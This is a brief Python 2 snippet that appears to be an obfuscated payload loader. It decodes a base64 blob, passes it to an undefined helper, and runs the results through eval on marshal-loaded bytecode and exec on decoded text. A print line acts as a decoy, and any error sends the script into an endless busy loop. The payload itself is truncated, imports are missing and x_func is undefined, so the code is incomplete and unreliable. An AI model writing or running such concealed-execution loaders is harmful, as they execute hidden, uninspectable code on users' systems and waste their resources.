def c1(x, y):
    eval(marshal.loads(x))
    exec base64.b64decode(y)
t = "Code block demands input:"
print t

## f12 string truncated
f12 = 'AmFhYWFkYWFhZmFhYSJhYWESFGFhYQVgYQVhYQ1hYRxhYQVgYQVhYQ1gYRxgYR1hYQthYeJhYR>'
x, y = x_func(base64.b64decode(f12))

try:
    c1(x, y)
except:
    while 1:
        pass
